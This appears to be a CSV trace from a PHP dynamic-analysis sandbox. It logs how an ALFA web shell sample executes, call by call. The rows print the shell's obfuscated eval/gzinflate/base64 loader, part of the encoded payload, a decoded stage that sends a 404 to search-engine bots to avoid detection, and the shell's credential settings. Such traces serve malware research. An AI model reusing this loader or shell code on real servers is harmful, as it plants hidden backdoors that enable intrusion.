"uuid","file_md5","index","source","target","argc","argv","return","dynamic"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","10","eval","zend_compile_string","2","{""value"": [[0, ""source_string"", ""/* BSvKDRAYGaWeOqbvzAnBtwzkFUFNAfgTNvEQKIeIUkvokgJlvnApmNAjBSrJxLVXxehqFAhoFBIhMGCaTBfgFgasYGhQPcOJYQTZ */
/* You're killing me again \xf0\x9f\x8e\xa7 Am I still in your head ? \xf0\x9f\x8e\xa7 You used to light me up \xf0\x9f\x8e\xa7 Now you shut me down -- Solevisible */
@session_start();function __ZW5jb2Rlcg($s){return juWzljYoeQ($s);}function __ZGVjb2Rlcg($s){return OICUgCjFFd($s);}$GLOBALS['DB_NAME'] = $GLOBALS['iApUYBpdJt'];$check = false;if(!isset($_SESSION[""alfa_settings_signature""])){$check = true;}else{if($_SESSION[""alfa_settings_signature""] != md5(print_r($GLOBALS['DB_NAME'], true))){$check = true;}}if($check){$_SESSION[""alfa_settings_signature""] = md5(print_r($GLOBALS['DB_NAME'], true));foreach($GLOBALS['iApUYBpdJt'] as $key => $value){$prefix = substr($key, 0, 2);if($prefix == ""us""){$GLOBALS['DB_NAME'][""user""] = $value;$GLOBALS['DB_NAME'][""user_rand""] = $key;}elseif($prefix == ""pa""){$GLOBALS['DB_NAME'][""pass""] = $value;$GLOBALS['DB_NAME'][""pass_rand""] = $key;}elseif($prefix == ""sa""){$GLOBALS['DB_NAME'][""safemode""] = $value;$GLOBALS['DB_NAME'][""safemode_rand""] = $key;}elseif($prefix == ""lo""){$GLOBALS['DB_NAME'][""login_page""] = $value;$GLOBALS['DB_NAME'][""login_page_rand""] = $key;}elseif($prefix == ""sh""){$GLOBALS['DB_NAME'][""show_icons""] = $value;$GLOBALS['DB_NAME'][""show_icons_rand""] = $key;}elseif($prefix == ""po""){$GLOBALS['DB_NAME'][""post_encryption""] = $value;$GLOBALS['DB_NAME'][""post_encryption_rand""] = $key;}}$_SESSION[""alfa_db_settings""] = $GLOBALS['DB_NAME'];}else{$GLOBALS['DB_NAME'] = $_SESSION[""alfa_db_settings""];}unset($GLOBALS['iApUYBpdJt']);
if(!isset($_SERVER[""HTTP_HOST""]))exit();
eval(gzinflate(base64_decode('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""]]}","{""value"": ""393C3A000050515393892659730D2B262A5051505142413C6A3C122B262A2B505142413C6A3C53938950514D4E8926264241413C26112B53549389535493892A112B53549389535493892A112B53549389535493892A112B53549389535493892A112B53549389535493892A112B53549389535493892A2A3150515393892A50515393895F4B59730D2B4F2A413C6A3C493E""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","11","eval","session_start","0","{""value"": []}","{""value"": ""void""}","[]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","12","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","13","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","14","eval","print_r","2","{""value"": [[0, ""var"", []], [1, ""return"", true]]}","{""value"": ""Array
(
    [usBluWnZAufT] => admin
    [paCYhFrESOpt] => a6f452ec3293d7fb72c5b677257b20ec
    [saMTHfdUWzmI] => 0
    [loIygqlMdf""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","15","eval","md5","1","{""value"": [[0, ""str"", ""Array
(
    [usBluWnZAufT] => admin
    [paCYhFrESOpt] => a6f452ec3293d7fb72c5b677257b20ec
    [saMTHfdUWzmI] => 0
    [loIygqlMdf""]]}","{""value"": ""84a6310bc014294e431227d37f3a9863""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","16","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","17","eval","substr","3","{""value"": [[0, ""str"", ""usBluWnZAufT""], [1, ""start"", 0], [2, ""length"", 2]]}","{""value"": ""us""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","18","eval","substr","3","{""value"": [[0, ""str"", ""paCYhFrESOpt""], [1, ""start"", 0], [2, ""length"", 2]]}","{""value"": ""pa""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","19","eval","substr","3","{""value"": [[0, ""str"", ""saMTHfdUWzmI""], [1, ""start"", 0], [2, ""length"", 2]]}","{""value"": ""sa""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","20","eval","substr","3","{""value"": [[0, ""str"", ""loIygqlMdffr""], [1, ""start"", 0], [2, ""length"", 2]]}","{""value"": ""lo""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","21","eval","substr","3","{""value"": [[0, ""str"", ""shCizvsLHOEc""], [1, ""start"", 0], [2, ""length"", 2]]}","{""value"": ""sh""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","22","eval","substr","3","{""value"": [[0, ""str"", ""poxvgiWfJLSJ""], [1, ""start"", 0], [2, ""length"", 2]]}","{""value"": ""po""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","23","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","24","eval","base64_decode","1","{""value"": [[0, ""str"", ""7L1pe+JIsij8ueZ55j+o1O4SjDGrdxd2ecFLlXfjtezLCCRANiBKEsZ2te9vfyMiM6XUAsbV3efMue/pmTKQa2RkZmREZGTE2urntX67/89/WM3UR7Pb955TU7WzyulF5f""]]}","{""value"": ""\xec\xbdi{\xe2H\xb2(\xfc\xb9\xe6y\xe6?\xa8\xd4\xee\x12\x8c1\xabw\x17vy\xc1K\x95w\xe3\xb5\xec\xcb\x08$@6 J\x12\xc6v\xb5\xefo\x7f#""3\xa5\xd4\x02\xc6\xd5\xdd\xe7\xcc\xb9\xef\xe9\x992\x90kddfdDdd\xc4\xda\xea\xe7\xb5~\xbb\xff\xcf\x7fX\xcd\xd4G\xb3\xdb\xf7\x9eSS\xb5\xb3\xca\xe9E\xe5\xf4\xbb\xb6[\xad\x1e\xd7\xce\xe1Wm}\xa7rX\xd5\xee\xd2\xe9\x9fS\x03\xd7t\xd6[f\xcfs\x95\xb2\xa2;""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","25","eval","gzinflate","1","{""value"": [[0, ""data"", ""\xec\xbdi{\xe2H\xb2(\xfc\xb9\xe6y\xe6?\xa8\xd4\xee\x12\x8c1\xabw\x17vy\xc1K\x95w\xe3\xb5\xec\xcb\x08$@6 J\x12\xc6v\xb5\xefo\x7f#""3\xa5\xd4\x02\xc6\xd5\xdd\xe7\xcc\xb9\xef\xe9\x992\x90kddfdDdd\xc4\xda\xea\xe7\xb5~\xbb\xff\xcf\x7fX\xcd\xd4G\xb3\xdb\xf7\x9eSS\xb5\xb3\xca\xe9E\xe5\xf4\xbb\xb6[\xad\x1e\xd7\xce\xe1Wm}\xa7rX\xd5\xee\xd2\xe9\x9fS\x03\xd7t\xd6[f\xcfs\x95\xb2\xa2;""]]}","{""value"": ""?><?php
if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array(""Google"",""Slurp"",""MSNBot"",""ia_archiver"",""Yandex"",""Rambler"",""b""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","26","eval","eval","1","{""value"": [[0, ""phpcode"", ""?><?php
if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array(""Google"",""Slurp"",""MSNBot"",""ia_archiver"",""Yandex"",""Rambler"",""b""]]}","{""value"": null}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","27","eval","zend_compile_string","2","{""value"": [[0, ""source_string"", ""?><?php
if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array(""Google"",""Slurp"",""MSNBot"",""ia_archiver"",""Yandex"",""Rambler"",""bot"",""spider"");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
if(!isset($GLOBALS['DB_NAME']['pass']))exit('$GLOBALS[\'DB_NAME\'][\'pass\']');
if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemode\']');
if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
date_default_timezone_set('Asia/Tehran');
define(""__ALFA_MD5NAME__"", md5($_SERVER[""SCRIPT_FILENAME""]));
define(""__ALFA_VERSION__"", ""3.0.2"");
define(""__LAST_CWD__"", ""last_cwd_"".__ALFA_MD5NAME__);
define(""__PATH_HISTORY__"", ""path_history_"".__ALFA_MD5NAME__);
define(""__ALFA_POST_ENCRYPTION__"", (isset($GLOBALS[""DB_NAME""][""post_encryption""])&&$GLOBALS[""DB_NAME""][""post_encryption""]==true?true:false));
$GLOBALS['__ALFA_COLOR__'] = array(
		""shell_border"" => array(
			""key_color"" => ""#0E304A"",
			""multi_selector"" => array(
				"".header"" => ""border: 7px solid {color}"",
				""#meunlist"" => ""border-color: {color}"",
				""#hidden_sh"" => ""background-color: {color}"",
				"".ajaxarea"" => ""border: 1px solid {color}"",
				"".foot"" => ""border-color: {color}"",
			)
		),
		""header_vars"" => ""#27979B"",
		""header_values"" => ""#67ABDF"",
		""header_on"" => ""#00FF00"",
		""header_off"" => ""#ff0000"",
		""header_none"" => ""#00FF00"",
		""home_shell"" => ""#ff0000"",
		""home_shell:hover"" => array(
			""key_color"" => ""#FFFFFF"",
			""multi_selector"" => array(
				"".home_shell:hover"" => ""color: {color};"",
			)
		),
		""back_shell"" => ""#efbe73"",
		""back_shell:hover"" => array(
			""key_color"" => ""#FFFFFF"",
			""multi_selector"" => array(
				"".back_shell:hover"" => ""color: {color};"",
			)
		),
		""header_pwd"" => ""#00FF00"",
		""header_pwd:hover"" => array(
			""key_color"" => ""#FFFFFF"",
			""multi_selector"" => array(
				"".header_pwd:hover"" => ""color: {color};"",
			)
		),
		""header_drive"" => ""#00FF00"",
		""header_drive:hover"" => array(
			""key_color"" => ""#FFFFFF"",
			""multi_selector"" => array(
				"".header_drive:hover"" => ""color: {color};"",
			)
		),
		""header_show_all"" => ""#00FF00"",
		""disable_functions"" => ""#ff0000"",
		""footer_text"" => ""#27979B"",
		""menu_options"" => ""#27979B"",
		""menu_options:hover"" => array(
			""key_color"" => ""#646464"",
			""multi_selector"" => array(
				"".menu_options:hover"" => ""background-color: {color};font-weight: unset;"",
			)
		),
		""options_list"" => array(
			""key_color"" => ""#00FF00"",
			""multi_selector"" => array(
				"".ajaxarea .header center a"" => ""color: {color};"",
			)
		),
		""options_list:hover"" => array(
			""key_color"" => ""#FFFFFF"",
			""multi_selector"" => array(
				"".ajaxarea .header center a:hover"" => ""color: {color};"",
			)
		),
		""options_list_header"" => array(
			""key_color"" => ""#59cc33"",
			""multi_selector"" => array(
				"".txtfont_header"" => ""color: {color};"",
			)
		),
		""options_list_text"" => array(
			""key_color"" => ""#FFFFFF"",
			""multi_selector"" => array(
				"".txtfont,.tbltxt"" => ""color: {color};"",
			)
		),
		""Alfa+"" => array(
			""key_color"" => ""#27E8AE"",
			""multi_selector"" => array(
				"".alfa_plus"" => ""color: {color};font-weight: unset;"",
			)
		),
		""hidden_shell_text"" => array(
			""key_color"" => ""#00FF00"",
			""multi_selector"" => array(
				""#hidden_sh a"" => ""color: {color};"",
			)
		),
		""hidden_shell_version"" => ""#ff0000"",
		""shell_name"" => ""#FF0000"",
		""main_row:hover"" => array(
			""key_color"" => ""#646464"",
			""multi_selector"" => array(
				"".main tr:hover"" => ""background-color: {color};"",
			)
		),
		""main_header"" => array(
			""key_color"" => ""#FFFFFF"",
			""multi_selector"" => array(
				"".main th"" => ""color: {color};"",
			)
		),
		""main_na""]]}","{""value"": ""59730D2B47484848484848482641423C0808415051423C2B413C4F2A2A595A730D2B4F2A595A730D2B4F2A595A730D2B4F2A595A730D2B4F2A595A730D2B4F2A595A730D2B4F2A413C415051423C6A3C41413C416308413C416308413C41595A732E50515111342B162A16413C4747484848484847484848484848474748484847474848484747484848474748484848484847474848474748484747484847474848474748484747484847474848484847474848474748484747484848484848484848474748484747484847474848474748484747484847474848474748484747484847474848474748484747484847474848474748484747484847474848474748484747484847474848474748484747484847474848474748484747484847474848484747484847474848474748484747484847474848474748484747484847474848484848474748484747484853938941414141413C6A3C6A3C5393895051514750515148505151485051514826393C3A512B59732B50519D2A9D262651112B3950513A51122E3950513A395051423C3A12342B3950513A51112E395051423C3A5111342B3950515393893A39395051423C3A5393893A39505108413C3A2A630808630808284F2A2A51112B3950513A395051423C3A122B395051423C3A51112B3950515393893A39395051423C3A5393893A505108413C2A50510808080808284F2A2A51112B3950513A395051423C3A122B395051423C3A51112B3950515393893A39395051423C3A5393893A505108413C2A50510808080808284F2A2A51112B3950513A395051423C3A122B395051423C3A51112B3950515393893A39395051423C3A5393893A505108413C2A50510808080808284F2A2A2A0000000059732B8D2A0000000059732B390B413C3A282828413C2B3C9D2A9D08082839413C3A262B262A2608082850510808280808284141393C3A6A3C080828373837282839413C3A26722B262A283828285051080828413C2B395051423C3A9D2A9D080828284141393C3A6A3C08082859732B39505151423950513A6A3C0850515108413C3A2B282A282A2859732B4141413C6A3C112B262A264141393C3A6A3C6A3C080808085051423C0826423C282A284F2A390B413C3A3941413C3A3941413C3A3941413C3A3941413C3A39413C3A413C2B39413C3A2A504D4E8926265051423C2B2650514D4E89264141423C6A3C26423C6A3C5354938924462A312A4141423C6A3C26423C6A3C5393892A312626264141413C6A3C112B5393892A539389393C3A5393895051122B6350515051122B636350515393892A2A53938959732B395051423C3A0D2B5393892A2A6359732E63505112342E59730D342B6350519D2A393C3A9D53938939633A0D2B393C3A5393892A5051112B41415051423C53938941415051423C539389634141635051423C5393892A5051423C02505151122B561E892A000000000000000000000000000000000000000000000000000000000000000000000000000000413C0D2E39413C3A6A413C0F342B8D2A413C0D2E39413C3A6A413C0F342B8D2A00000000413C0D2B8D2A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000059732B722E08413C342B5393892A5393892A59730D2E505108413C342B505108413C2A4F3E""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","28","eval","implode","2","{""value"": [[0, ""glue"", ""|""], [1, ""pieces"", []]]}","{""value"": ""Google|Slurp|MSNBot|ia_archiver|Yandex|Rambler|bot|spider""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","29","eval","zend_fetch_r_server","1","{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","30","eval","preg_match","2","{""value"": [[0, ""pattern"", ""/Google|Slurp|MSNBot|ia_archiver|Yandex|Rambler|bot|spider/i""], [1, ""subject"", ""python-requests/2.7.0 CPython/2.7.5 Linux/3.10.0-957.21.3.el7.x86_64""]]}","{""value"": 0}","[0, 135]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","31","eval","date_default_timezone_set","1","{""value"": [[0, ""timezone_identifier"", ""Asia/Tehran""]]}","{""value"": ""void""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","32","eval","zend_fetch_r_server","1","{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","33","eval","md5","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_643c5f0e-0307-11eb-b91f-00163e142113.php""]]}","{""value"": ""266b4469df1ee490013cb5ff4959ab99""}","[0]"
